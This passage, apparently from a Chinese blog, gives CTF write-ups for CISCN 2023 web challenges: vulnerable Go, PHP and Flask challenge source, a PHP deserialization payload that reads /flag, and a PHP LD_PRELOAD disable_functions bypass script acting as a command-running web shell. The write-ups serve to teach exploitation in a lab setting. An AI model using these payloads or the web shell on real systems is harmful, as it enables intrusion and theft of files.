class="hljs-string">&quot;no&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">index</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;hello world&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>router := gin.Default()<br>router.GET(<span class="hljs-string">&quot;/&quot;</span>, index)<br>router.GET(<span class="hljs-string">&quot;/admin/rename&quot;</span>, admin)<br><br><span class="hljs-keyword">if</span> err := router.Run(<span class="hljs-string">&quot;:8887&quot;</span>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="CISCN-2023-初赛-go-session"><a href="#CISCN-2023-初赛-go-session" class="headerlink" title="[CISCN 2023 初赛]go_session"></a>[CISCN 2023 初赛]go_session</h2><p>进去提示<code>Hello, guest</code>，结合题目直接抓包：</p><p><img src="/img/2023ciscngo_session1.png" alt="2023ciscngo_session1"></p><p><code>main.go</code>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;main/route&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.GET(<span class="hljs-string">&quot;/&quot;</span>, route.Index)<br>r.GET(<span class="hljs-string">&quot;/admin&quot;</span>, route.Admin)<br>r.GET(<span class="hljs-string">&quot;/flask&quot;</span>, route.Flask)<br>r.Run(<span class="hljs-string">&quot;0.0.0.0:80&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>route.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> route<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/flosch/pongo2/v6&quot;</span><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;github.com/gorilla/sessions&quot;</span><br><span class="hljs-string">&quot;html&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">&quot;SESSION_KEY&quot;</span>)))<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Index</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-literal">nil</span> &#123;<br>session.Values[<span class="hljs-string">&quot;name&quot;</span>] = <span class="hljs-string">&quot;guest&quot;</span><br>err = session.Save(c.Request, c.Writer)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><br>c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;Hello, guest&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Admin</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] != <span class="hljs-string">&quot;admin&quot;</span> &#123;<br>http.Error(c.Writer, <span class="hljs-string">&quot;N0&quot;</span>, http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>name := c.DefaultQuery(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;ssti&quot;</span>)<br>xssWaf := html.EscapeString(name)<br>tpl, err := pongo2.FromString(<span class="hljs-string">&quot;Hello &quot;</span> + xssWaf + <span class="hljs-string">&quot;!&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>out, err := tpl.Execute(pongo2.Context&#123;<span class="hljs-string">&quot;c&quot;</span>: c&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>c.String(<span class="hljs-number">200</span>, out)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Flask</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, <span class="hljs-string">&quot;N0&quot;</span>, http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>resp, err := http.Get(<span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;guest&quot;</span>))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br>body, _ := io.ReadAll(resp.Body)<br><br>c.String(<span class="hljs-number">200</span>, <span class="hljs-type">string</span>(body))<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="CISCN-2023-华北-ez-date"><a href="#CISCN-2023-华北-ez-date" class="headerlink" title="[CISCN 2023 华北]ez_date"></a>[CISCN 2023 华北]ez_date</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )&#123;<br>            <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])); <br></code></pre></td></tr></table></figure><p>class类中存在<code>__wakeup</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )<br></code></pre></td></tr></table></figure><p>限制<code>a</code>和<code>b</code>不能为数组，然后就是比较经典的强等于。限制了数组的话可以用碰撞解题，但后面还连着一个<code>sha1</code>&#x3D;&#x3D;&#x3D;<code>sha1</code></p><p>强等于除了数组外存在如下方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-number">12</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-string">&#x27;12&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span> &amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-number">12</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;12&#x27;</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no ok&#x27;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-comment">//结果：</span><br>ok<br><span class="hljs-keyword">string</span>(<span class="hljs-number">40</span>) <span class="hljs-string">&quot;7b52009b64fd0a2a49e6d8a939753077792b0554&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">40</span>) <span class="hljs-string">&quot;7b52009b64fd0a2a49e6d8a939753077792b0554&quot;</span><br></code></pre></td></tr></table></figure><p>然后对<code>file</code>变量调用了<code>date</code>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br></code></pre></td></tr></table></figure><p>这东西可以用来转义，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;/f\l\a\g&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果:</span><br>/fSundayam9<br>/flag<br></code></pre></td></tr></table></figure><p>然后是对经过<code>date</code>函数转义后数据的处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>先利用<code>file_put_contents</code>函数把<code>$content</code>放到生成的<code>$uuid</code>文件中，然后利用正则匹配将文件中的空白字符和换行替换为空字符，再赋值给<code>$data</code>。最后利用<code>file_get_contents</code>和<code>echo</code>配合输出。</p><p>所以构造<code>payload</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/f\l\a\g&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">date</span>();<br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$d</span>);<br></code></pre></td></tr></table></figure><p>最后是这几个<code>file_get_contents</code>和<code>file_get_contenes</code>的组合使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>首先<code>$content</code>成了<code>/flag</code>，然后file_put_contents把&#x2F;<code>flag</code>这个字符串写到目标文件里，然后<code>file_get_contents($uuid)</code>这东西把文件内容赋值给<code>$data</code>，这时<code>$data</code>成了<code>/flag</code>。最后再利用一个<code>file_get_contents</code>去读<code>/flag</code>的内容。</p><h4 id="思路总结："><a href="#思路总结：" class="headerlink" title="思路总结："></a>思路总结：</h4><p>PHP中除数组外是否有其它方法绕过强等于？<code>date</code>函数可以起到转义作用。</p><h2 id="CISCN-2023-西南-do-you-like-read"><a href="#CISCN-2023-西南-do-you-like-read" class="headerlink" title="[CISCN 2023 西南]do_you_like_read"></a>[CISCN 2023 西南]do_you_like_read</h2><p>下载附件，靠这么多：</p><p><img src="/img/2023ciscndoulikeread1.png" alt="2023ciscndoulikeread1"></p><p><code>test</code>文件夹下存在：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;<br><br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br>    <span class="hljs-variable">$out_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;outpath&quot;</span>];<br>    <span class="hljs-variable">$evil_cmdline</span> = <span class="hljs-variable">$cmd</span> . <span class="hljs-string">&quot; &gt; &quot;</span> . <span class="hljs-variable">$out_path</span> . <span class="hljs-string">&quot; 2&gt;&amp;1&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="hljs-variable">$evil_cmdline</span> . <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="hljs-variable">$evil_cmdline</span>);<br><br>    <span class="hljs-variable">$so_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;sopath&quot;</span>];<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=&quot;</span> . <span class="hljs-variable">$so_path</span>);<br><br>    <span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . <span class="hljs-title function_ invoke__">nl2br</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$out_path</span>)) . <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>; <br><br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$out_path</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="CISCN-2023-华北-pysym"><a href="#CISCN-2023-华北-pysym" class="headerlink" title="[CISCN 2023 华北]pysym"></a>[CISCN 2023 华北]pysym</h2><p><code>requirement.txt</code>提示<code>Flask</code></p><p><code>app.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, send_from_directory<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="hljs-string">&#x27;uploads&#x27;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">POST</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No file uploaded.&#x27;</span><br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    <span class="hljs-keyword">if</span> file.content_length &gt; <span class="hljs-number">10240</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;file too lager&#x27;</span><br>    path = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="hljs-number">16</span>))<br>    directory = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)<br>    os.makedirs(directory, mode=<span class="hljs-number">0o755</span>, exist_ok=<span class="hljs-literal">True</span>)<br>    savepath=os.path.join(directory, file.filename)<br>    file.save(savepath)<br>    <span class="hljs-keyword">try</span>:<br>     os.system(<span class="hljs-string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(savepath,directory))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;something wrong in extracting&#x27;</span><br><br>    links = []<br>    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(directory):<br>        <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> files:<br>            extractedfile =os.path.join(root, name)<br>            <span class="hljs-keyword">if</span> os.path.islink(extractedfile):<br>                os.remove(extractedfile)<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no symlink&#x27;</span><br>            <span class="hljs-keyword">if</span>  os.path.isdir(path) :<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no directory&#x27;</span><br>            links.append(extractedfile)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,links=links)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/uploads/&lt;path:path&gt;&quot;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">path</span>):<br>    filepath = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(filepath):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;404&#x27;</span>, <span class="hljs-number">404</span><br>    <span class="hljs-keyword">return</span> send_from_directory(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">1337</span>)<br></code></pre></td></tr></table></figure><p>大致就是一个实现解压特定路径的压缩包到其它特定路径的功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 